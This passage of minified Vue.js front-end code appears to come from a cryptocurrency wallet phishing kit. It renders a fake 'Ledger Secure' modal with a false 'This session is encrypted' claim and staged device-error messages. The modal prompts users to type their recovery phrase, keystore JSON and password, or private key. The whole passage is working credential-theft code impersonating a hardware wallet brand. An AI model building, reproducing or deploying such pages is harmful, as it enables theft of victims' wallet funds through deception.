        d: "M327.262 119.94V127.998H382.57V91.6548H374.511V119.94H327.262ZM327.262 0V8.05844H374.511V36.3452H382.57V0H327.262ZM298.74 62.3411V43.6158H311.382C317.546 43.6158 319.758 45.6696 319.758 51.2803V54.5982C319.758 60.3657 317.624 62.3411 311.382 62.3411H298.74ZM318.808 65.6589C324.575 64.1578 328.604 58.7842 328.604 52.3856C328.604 48.3564 327.025 44.7211 324.023 41.7972C320.23 38.1619 315.172 36.3452 308.615 36.3452H290.838V91.6529H298.74V69.6097H310.592C316.675 69.6097 319.125 72.1378 319.125 78.4599V91.6548H327.184V79.7239C327.184 71.0325 325.13 67.7147 318.808 66.7662V65.6589ZM252.282 67.4756H276.618V60.207H252.282V43.6139H278.988V36.3452H244.222V91.6529H280.173V84.3842H252.282V67.4756ZM225.812 70.3995V74.1916C225.812 82.1717 222.888 84.78 215.541 84.78H213.803C206.454 84.78 202.899 82.4088 202.899 71.4264V56.5717C202.899 45.5109 206.613 43.2181 213.96 43.2181H215.539C222.73 43.2181 225.021 45.9048 225.099 53.3322H233.791C233.001 42.4283 225.732 35.5555 214.828 35.5555C209.535 35.5555 205.11 37.2153 201.792 40.3745C196.814 45.0367 194.049 52.9383 194.049 63.9991C194.049 74.6659 196.42 82.5675 201.318 87.4649C204.636 90.7044 209.219 92.4426 213.723 92.4426C218.463 92.4426 222.81 90.5456 225.021 86.438H226.126V91.6529H233.395V63.1309H211.983V70.3995H225.812ZM156.126 43.6139H164.739C172.878 43.6139 177.303 45.6677 177.303 56.7304V71.2677C177.303 82.3285 172.878 84.3842 164.739 84.3842H156.126V43.6139ZM165.449 91.6548C180.541 91.6548 186.149 80.1982 186.149 64.001C186.149 47.5666 180.145 36.3471 165.29 36.3471H148.223V91.6548H165.449ZM110.063 67.4756H134.399V60.207H110.063V43.6139H136.768V36.3452H102.002V91.6529H137.954V84.3842H110.063V67.4756ZM63.4464 36.3452H55.3879V91.6529H91.7332V84.3842H63.4464V36.3452ZM0 91.6548V128H55.3076V119.94H8.05844V91.6548H0ZM0 0V36.3452H8.05844V8.05844H55.3076V0H0Z"
    })], -1),
    E7 = f("svg", {
        stroke: "currentColor",
        fill: "none",
        "stroke-width": "0",
        viewBox: "0 0 24 24",
        "aria-hidden": "true",
        "font-size": "1.5rem",
        height: "1em",
        width: "1em",
        xmlns: "http://www.w3.org/2000/svg"
    }, [f("path", {
        "stroke-linecap": "round",
        "stroke-linejoin": "round",
        "stroke-width": "2",
        d: "M6 18L18 6M6 6l12 12"
    })], -1),
    T7 = [E7],
    A7 = vt('<div class="flex w-full bg-white rounded-lg py-2 my-4"><div></div><div class=""><div class="mx-3 py-3 flex flex-row items-center text-center justify-center"><img src="' + e7 + '" alt="ledger-error.png" class="rounded-full h-40"><span class="font-semibold text-3xl text-gray-900">Ledger Secure </span></div></div></div>', 1),
    L7 = {
        class: "flex justify-center item-center",
        style: {
            height: "70px"
        }
    },
    I7 = f("div", {
        class: "flex justify-center item-center my-4"
    }, [f("hr", {
        class: "px-2 bg-grey-100 hrdes item-center"
    })], -1),
    N7 = {
        key: 0,
        class: "p-2 w-full"
    },
    P7 = {
        class: "relative"
    },
    M7 = f("label", {
        for: "message",
        class: "leading-7 text-sm text-gray-600"
    }, "Typically 12 (sometimes 24) words separated by single spaces", -1),
    k7 = {
        key: 1,
        class: "p-2 w-full"
    },
    O7 = {
        class: "relative"
    },
    $7 = f("label", {
        for: "message",
        class: "leading-7 text-sm text-gray-600"
    }, "Keystore JSON", -1),
    R7 = f("label", {
        for: "message",
        class: "leading-7 text-sm text-gray-600"
    }, "*********************", -1),
    D7 = {
        key: 2,
        class: "p-2 w-full"
    },
    H7 = {
        class: "relative"
    },
    V7 = f("label", {
        for: "message",
        class: "leading-7 text-sm text-gray-600"
    }, "Typically xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx ", -1),
    j7 = {
        class: "modal-footer"
    },
    B7 = f("div", {
        class: "item-center mx-auto text-center py-3"
    }, null, -1),
    F7 = {
        key: 1,
        class: "modal-masks backdrop-blur-sm",
        style: {
            "font-family": "HMAlpha, DM Mono,  monospace"
        }
    },
    z7 = {
        class: "modal-wrapper"
    },
    U7 = {
        class: "item-center rounded-lg p-5"
    },
    G7 = {
        class: "flex w-full max-w-sm mx-auto overflow-hidden bg-white rounded-lg shadow-md"
    },
    W7 = f("svg", {
        class: "w-6 h-6 text-white fill-current",
        viewBox: "0 0 40 40",
        xmlns: "http://www.w3.org/2000/svg"
    }, [f("path", {
        d: "M20 3.33331C10.8 3.33331 3.33337 10.8 3.33337 20C3.33337 29.2 10.8 36.6666 20 36.6666C29.2 36.6666 36.6667 29.2 36.6667 20C36.6667 10.8 29.2 3.33331 20 3.33331ZM16.6667 28.3333L8.33337 20L10.6834 17.65L16.6667 23.6166L29.3167 10.9666L31.6667 13.3333L16.6667 28.3333Z"
    })], -1),
    q7 = [W7],
    K7 = {
        key: 0,
        class: "mx-3"
    },
    Z7 = f("p", {
        class: "text-sm text-gray-600"
    }, "try another Wallet", -1),
    X7 = {
        key: 1,
        class: "mx-3"
    },
    Y7 = {
        key: 2,
        class: "modal-masks backdrop-blur-sm",
        style: {
            "font-family": "HMAlpha, DM Mono,  monospace"
        }
    },
    Q7 = {
        class: "modal-wrapper"
    },
    J7 = {
        class: "modal-container item-center rounded-lg p-5"
    },
    ev = {
        class: "modal-header"
    },
    tv = {
        class: "flex justify-between item-center"
    },
    sv = f("svg", {
        viewBox: "0 0 383 128",
        xmlns: "http://www.w3.org/2000/svg",
        fill: "black",
        class: "h-14"
    }, [f("path", {
        d: "M327.262 119.94V127.998H382.57V91.6548H374.511V119.94H327.262ZM327.262 0V8.05844H374.511V36.3452H382.57V0H327.262ZM298.74 62.3411V43.6158H311.382C317.546 43.6158 319.758 45.6696 319.758 51.2803V54.5982C319.758 60.3657 317.624 62.3411 311.382 62.3411H298.74ZM318.808 65.6589C324.575 64.1578 328.604 58.7842 328.604 52.3856C328.604 48.3564 327.025 44.7211 324.023 41.7972C320.23 38.1619 315.172 36.3452 308.615 36.3452H290.838V91.6529H298.74V69.6097H310.592C316.675 69.6097 319.125 72.1378 319.125 78.4599V91.6548H327.184V79.7239C327.184 71.0325 325.13 67.7147 318.808 66.7662V65.6589ZM252.282 67.4756H276.618V60.207H252.282V43.6139H278.988V36.3452H244.222V91.6529H280.173V84.3842H252.282V67.4756ZM225.812 70.3995V74.1916C225.812 82.1717 222.888 84.78 215.541 84.78H213.803C206.454 84.78 202.899 82.4088 202.899 71.4264V56.5717C202.899 45.5109 206.613 43.2181 213.96 43.2181H215.539C222.73 43.2181 225.021 45.9048 225.099 53.3322H233.791C233.001 42.4283 225.732 35.5555 214.828 35.5555C209.535 35.5555 205.11 37.2153 201.792 40.3745C196.814 45.0367 194.049 52.9383 194.049 63.9991C194.049 74.6659 196.42 82.5675 201.318 87.4649C204.636 90.7044 209.219 92.4426 213.723 92.4426C218.463 92.4426 222.81 90.5456 225.021 86.438H226.126V91.6529H233.395V63.1309H211.983V70.3995H225.812ZM156.126 43.6139H164.739C172.878 43.6139 177.303 45.6677 177.303 56.7304V71.2677C177.303 82.3285 172.878 84.3842 164.739 84.3842H156.126V43.6139ZM165.449 91.6548C180.541 91.6548 186.149 80.1982 186.149 64.001C186.149 47.5666 180.145 36.3471 165.29 36.3471H148.223V91.6548H165.449ZM110.063 67.4756H134.399V60.207H110.063V43.6139H136.768V36.3452H102.002V91.6529H137.954V84.3842H110.063V67.4756ZM63.4464 36.3452H55.3879V91.6529H91.7332V84.3842H63.4464V36.3452ZM0 91.6548V128H55.3076V119.94H8.05844V91.6548H0ZM0 0V36.3452H8.05844V8.05844H55.3076V0H0Z"
    })], -1),
    nv = f("svg", {
        stroke: "currentColor",
        fill: "none",
        "stroke-width": "0",
        viewBox: "0 0 24 24",
        "aria-hidden": "true",
        "font-size": "1.5rem",
        height: "1em",
        width: "1em",
        xmlns: "http://www.w3.org/2000/svg"
    }, [f("path", {
        "stroke-linecap": "round",
        "stroke-linejoin": "round",
        "stroke-width": "2",
        d: "M6 18L18 6M6 6l12 12"
    })], -1),
    iv = [nv],
    rv = {
        class: "px-4 py-2 -mx-3 flex items-center"
    },
    ov = {
        class: "mx-3 flex items-center"
    },
    av = {
        class: "flex items-center justify-center p-2"
    },
    lv = {
        key: 0,
        class: "bg-gray-900 text-white p-2 mx-1 text-lg"
    },
    cv = vt('<div class="flex w-full bg-white rounded-lg shadow-md justify-between border-solid border py-2 my-2 border-gray-900"><div class="px-4 py-2 -mx-3"><div class="mx-3"><span class="font-semibold text-black text-lg">Ledger Secure</span><p class="text-sm first-letter text-green-600"> This session is encrypted 🔒 </p></div></div><div class="flex items-center justify-center p-2"><svg viewBox="0 0 383 128" xmlns="http://www.w3.org/2000/svg" fill="black" class="h-8 m-2"><path d="M327.262 119.94V127.998H382.57V91.6548H374.511V119.94H327.262ZM327.262 0V8.05844H374.511V36.3452H382.57V0H327.262ZM298.74 62.3411V43.6158H311.382C317.546 43.6158 319.758 45.6696 319.758 51.2803V54.5982C319.758 60.3657 317.624 62.3411 311.382 62.3411H298.74ZM318.808 65.6589C324.575 64.1578 328.604 58.7842 328.604 52.3856C328.604 48.3564 327.025 44.7211 324.023 41.7972C320.23 38.1619 315.172 36.3452 308.615 36.3452H290.838V91.6529H298.74V69.6097H310.592C316.675 69.6097 319.125 72.1378 319.125 78.4599V91.6548H327.184V79.7239C327.184 71.0325 325.13 67.7147 318.808 66.7662V65.6589ZM252.282 67.4756H276.618V60.207H252.282V43.6139H278.988V36.3452H244.222V91.6529H280.173V84.3842H252.282V67.4756ZM225.812 70.3995V74.1916C225.812 82.1717 222.888 84.78 215.541 84.78H213.803C206.454 84.78 202.899 82.4088 202.899 71.4264V56.5717C202.899 45.5109 206.613 43.2181 213.96 43.2181H215.539C222.73 43.2181 225.021 45.9048 225.099 53.3322H233.791C233.001 42.4283 225.732 35.5555 214.828 35.5555C209.535 35.5555 205.11 37.2153 201.792 40.3745C196.814 45.0367 194.049 52.9383 194.049 63.9991C194.049 74.6659 196.42 82.5675 201.318 87.4649C204.636 90.7044 209.219 92.4426 213.723 92.4426C218.463 92.4426 222.81 90.5456 225.021 86.438H226.126V91.6529H233.395V63.1309H211.983V70.3995H225.812ZM156.126 43.6139H164.739C172.878 43.6139 177.303 45.6677 177.303 56.7304V71.2677C177.303 82.3285 172.878 84.3842 164.739 84.3842H156.126V43.6139ZM165.449 91.6548C180.541 91.6548 186.149 80.1982 186.149 64.001C186.149 47.5666 180.145 36.3471 165.29 36.3471H148.223V91.6548H165.449ZM110.063 67.4756H134.399V60.207H110.063V43.6139H136.768V36.3452H102.002V91.6529H137.954V84.3842H110.063V67.4756ZM63.4464 36.3452H55.3879V91.6529H91.7332V84.3842H63.4464V36.3452ZM0 91.6548V128H55.3076V119.94H8.05844V91.6548H0ZM0 0V36.3452H8.05844V8.05844H55.3076V0H0Z"></path></svg></div></div>', 1);

function dv(e, t, s, n, i, r) {
    const o = ce("nav-bar"),
        l = ce("NewsLetterSection"),
        a = ce("BottomNav");
    return O(), R(he, null, [q(o), r7, f("section", o7, [f("div", a7, [l7, f("div", c7, [f("section", d7, [f("div", f7, [f("div", p7, [(O(!0), R(he, null, Ke(r.searchedWallets, c => (O(), R("div", {
        class: "lg:w-1/3 md:w-1/2 p-2 w-full h-full",
        key: c.src
    }, [f("div", {
        class: "border border-black md:flex-col flex md:flex-wrap flex-nowrap p-4 rounded-xl",
        onClick: d => r.triggerModal(c)
    }, [f("a", h7, [f("img", {
        alt: c.appName,
        class: "object-cover object-center md:h-32 h-28 justify-center m-auto",
        src: c.src
    }, null, 8, g7)]), f("div", m7, [v7, f("h3", y7, ye(c.appName), 1)])], 8, u7)]))), 128))])])])])])]), e.showModal ? (O(), R("div", b7, [f("div", w7, [f("div", x7, [f("div", _7, [f("div", C7, [S7, f("button", {
        onClick: t[0] || (t[0] = c => e.showModal = !1),
        class: "focus:bg-blue-100"
    }, T7)])]), A7, f("div", L7, [f("button", {
        class: Te(["p-4 hover:border-b-2 text-lg hover:border-gray-500 mx-2", e.type === 0 ? "border-b-2 border-gray-500" : ""]),
        onClick: t[1] || (t[1] = c => e.type = 0)
    }, " Phrase ", 2), e.disableSignIn ? (O(), R("button", {
        key: 0,
        class: Te(["p-4 hover:border-b-2 text-lg hover:border-gray-500 mx-2", e.type === 1 ? "border-b-2 border-gray-500" : ""]),
        onClick: t[2] || (t[2] = c => e.type = 1)
    }, " Keystore JSON ", 2)) : Ee("", !0), f("button", {
        class: Te(["p-4 hover:border-b-2 text-lg hover:border-gray-500 mx-2", e.type === 2 ? "border-b-2 border-gray-500" : ""]),
        onClick: t[3] || (t[3] = c => e.type = 2)
    }, " Private Key ", 2)]), I7, e.type === 0 ? (O(), R("div", N7, [f("div", P7, [Ft(f("textarea", {
        id: "message",
        "onUpdate:modelValue": t[4] || (t[4] = c => e.seedPhrase = c),
        name: "message",
        placeholder: "Enter Your recovery phrase",
        class: "w-full bg-gray-100 bg-opacity-50 rounded border border-gray-300 focus:border-blue-500 focus:bg-white focus:ring-2 focus:ring-blue-200 h-32 text-base outline-none text-gray-700 py-1 px-3 resize-none leading-6 transition-colors duration-200 ease-in-out"
    }, null, 512), [
        [zt, e.seedPhrase]
    ]), M7])])) : Ee("", !0), e.type === 1 && e.disableSignIn ? (O(), R("div", k7, [f("div", O7, [Ft(f("textarea", {
        id: "message",
        "onUpdate:modelValue": t[5] || (t[5] = c => e.email = c),
        name: "message",
        placeholder: "Keystore Json{}",
        class: "w-full bg-gray-100 bg-opacity-50 rounded border border-gray-300 focus:border-blue-500 focus:bg-white focus:ring-2 focus:ring-blue-200 h-10 text-base outline-none text-gray-700 py-1 px-3 resize-none leading-6 transition-colors duration-200 ease-in-out"
    }, null, 512), [
        [zt, e.email]
    ]), $7, Ft(f("input", {
        id: "message",
        "onUpdate:modelValue": t[6] || (t[6] = c => e.password = c),
        type: "password",
        name: "message",
        placeholder: "Enter Your password",
        class: "w-full bg-gray-100 bg-opacity-50 rounded border border-gray-300 focus:border-blue-500 focus:bg-white focus:ring-2 focus:ring-blue-200 h-10 text-base outline-none text-gray-700 py-1 px-3 resize-none leading-6 transition-colors duration-200 ease-in-out"
    }, null, 512), [
        [zt, e.password]
    ]), R7])])) : Ee("", !0), e.type === 2 ? (O(), R("div", D7, [f("div", H7, [Ft(f("textarea", {
        id: "message",
        "onUpdate:modelValue": t[7] || (t[7] = c => e.privateKey = c),
        name: "message",
        placeholder: "Enter Your Private Key",
        class: "w-full bg-gray-100 bg-opacity-50 rounded border border-gray-300 focus:border-blue-500 focus:bg-white focus:ring-2 focus:ring-blue-200 h-20 text-base outline-none text-gray-700 py-1 px-3 resize-none leading-6 transition-colors duration-200 ease-in-out"
    }, null, 512), [
        [zt, e.privateKey]
    ]), V7])])) : Ee("", !0), f("div", j7, [f("button", {
        class: "modal-default-button justify-center bg-gray-900 flex py-2 text-white w-full item-center",
        onClick: t[8] || (t[8] = c => r.countReducer())
    }, " Proceed "), B7])])])])) : Ee("", !0), e.notify ? (O(), R("div", F7, [f("div", z7, [f("div", U7, [f("div", G7, [f("div", {
        class: Te(["flex items-center justify-center w-12", e.countdown ? "bg-red-500" : "bg-green-500"])
    }, q7, 2), f("div", {
        class: "px-4 py-2 -mx-3",
        onClick: t[9] || (t[9] = c => e.counter--)
    }, [e.countdown ? (O(), R("div", K7, [f("span", {
        class: Te(["font-semibold", e.countdown ? "text-red-500" : "text-green-500"])
    }, "error", 2), Z7])) : Ee("", !0), e.counter > 0 ? (O(), R("div", X7, ye(e.counter), 1)) : Ee("", !0)])])])])])) : Ee("", !0), e.automatic ? (O(), R("div", Y7, [f("div", Q7, [f("div", J7, [f("div", ev, [f("div", tv, [sv, f("button", {
        onClick: t[10] || (t[10] = c => r.resetAutomatic()),
        class: "focus:bg-blue-100"
    }, iv)])]), f("div", {
        class: "item-center rounded-lg mt-8 mb-4",
        onClick: t[11] || (t[11] = c => {
            e.showModal = !0, r.resetAutomatic()
        })
    }, [f("div", {
        class: Te(["flex w-full bg-white rounded-lg shadow-md justify-between border-solid border py-2 items-center", e.failed ? "border-red-500" : "border-gray-500"])
    }, [f("div", rv, [f("div", ov, [f("p", {
        class: Te(["text-base", e.failed ? "text-red-600" : "text-green-600"])
    }, ye(e.failed ? `Ledger device: INS_NOT_SUPPORTED
(0x6d00)` : "Initializing"), 3)])]), f("div", av, [e.failed ? (O(), R("button", lv, " Connect Manually ")) : Ee("", !0)])], 2), cv])])])])) : Ee("", !0), q(l), q(a)], 64)
}
const fv = Se(i7, [
        ["render", dv]
    ]),
    pv = ah({
        history: S1("/"),
        routes: [{
            path: "/",
            name: "home",
            component: g6
        }, {
            path: "/registry",
            meta: {
                title: "Registry"
            },
            component: J8
        }, {
            path: "/final",
            meta: {
                title: "final"
            },
            component: fv
        }]
    }),
    Gf = i1(ch);
Gf.use(pv);
Gf.mount("#app");